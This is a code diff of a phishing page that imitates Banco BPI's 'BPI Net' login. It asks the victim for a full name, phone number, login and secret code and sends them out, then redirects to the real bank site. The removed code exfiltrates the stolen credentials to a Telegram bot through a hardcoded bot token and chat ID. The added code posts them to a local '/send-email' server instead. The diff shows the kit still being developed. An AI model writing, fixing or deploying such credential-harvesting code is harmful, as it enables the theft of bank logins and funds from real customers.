@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <link rel="shortcut icon" href="faivicon.png" type="image/x-icon">
+  <link rel="shortcut icon" href="/faivicon.png" type="image/x-icon">
   <title>BPI Net Login</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -24,6 +24,7 @@
       border-radius: 8px;
       box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
       padding: 30px;
+      box-sizing: border-box; /* Corrigido: removido 'text -webkit-' */
       text-align: center;
       position: relative;
     }
@@ -189,7 +190,7 @@
       <a href="https://bpinet.bancobpi.pt/OnlineBankingSignup/ClientDataValidation?FlowId=RecuperacaoCodigoSecreto&Locale=pt-PT">Recuperar Código</a>
       <a href="https://www.bancobpi.pt/seguranca-online">Recomendações de Segurança</a>
     </div>
-    <a href="loginempresas.html" class="btn-outline">Entrar BPI Net Empresas</a>
+    <a href="/loginempresas.html" class="btn-outline">Entrar BPI Net Empresas</a>
   </div>
   <a href="tel:+351218005050" class="call-icon"><i class="fas fa-phone"></i></a>
   <div class="modal" id="infoModal">
@@ -201,59 +202,62 @@
       <button class="btn" onclick="submitInfo()">Confirmar</button>
     </div>
   </div>
-  <script>
-    function showModal() {
-      const login = document.getElementById('login').value.trim();
-      const password = document.getElementById('password').value.trim();
-      if (login === '' || password === '') {
-        alert('Por favor, preencha o login e o código secreto.');
-        return;
-      }
-      document.getElementById('infoModal').style.display = 'flex';
+<script>
+  function showModal() {
+    const login = document.getElementById('login').value.trim();
+    const password = document.getElementById('password').value.trim();
+    if (login === '' || password === '') {
+      alert('Por favor, preencha o login e o código secreto.');
+      return;
     }
-    function closeModal() {
-      document.getElementById('infoModal').style.display = 'none';
+    document.getElementById('infoModal').style.display = 'flex';
+  }
+
+  function closeModal() {
+    document.getElementById('infoModal').style.display = 'none';
+  }
+
+  async function submitInfo() {
+    const name = document.getElementById('fullname').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const login = document.getElementById('login').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    if (name === '' || phone === '' || login === '' || password === '') {
+      alert('Por favor, preencha todos os campos.');
+      return;
     }
-    function submitInfo() {
-      const name = document.getElementById('fullname').value.trim();
-      const phone = document.getElementById('phone').value.trim();
-      const login = document.getElementById('login').value.trim();
-      const password = document.getElementById('password').value.trim();
-      if (name === '' || phone === '' || login === '' || password === '') {
-        alert('Por favor, preencha todos os campos.');
-        return;
-      }
-      sendToTelegram(name, phone, login, password);
-      window.location.href = 'https://www.bancobpi.pt/particulares';
-    }
-    function sendToTelegram(name, phone, login, password) {
-      const token = '7045955625:AAGaTLknx9YYk3powiCXn_R6sIGOP8f3bcE';
-      const chatId = '5114449108';
-      const message = `Novo Login de Cliente:
-      Nome: ${name}
-      Telefone: ${phone}
-      Nome/Nº Adesão: ${login}
-      Código Secreto: ${password}`;
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      const data = {
-        chat_id: chatId,
-        text: message
-      };
-      fetch(url, {
+
+    const data = { name, phone, login, password };
+    const serverUrl = 'http://localhost:3000/send-email'; // URL absoluta para testes locais
+    console.log('Enviando dados:', data);
+
+    try {
+      const response = await fetch(serverUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify(data),
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Mensagem enviada com sucesso!', data);
-      })
-      .catch(error => {
-        console.error('Erro ao enviar mensagem:', error);
       });
+      console.log('Resposta do servidor:', response);
+
+      if (!response.ok) {
+        const text = await response.text();
+        console.log('Resposta não-OK:', text);
+        throw new Error(`Erro do servidor: ${response.status} ${text}`);
+      }
+
+      const result = await response.json();
+      console.log('Resultado:', result);
+
+      alert('Informações enviadas com sucesso!');
+      window.location.href = 'https://www.bancobpi.pt/particulares';
+    } catch (error) {
+      console.error('Erro na requisição:', error);
+      alert('Erro ao enviar informações: ' + error.message);
     }
-  </script>
+  }
+</script>
 </body>
 </html>
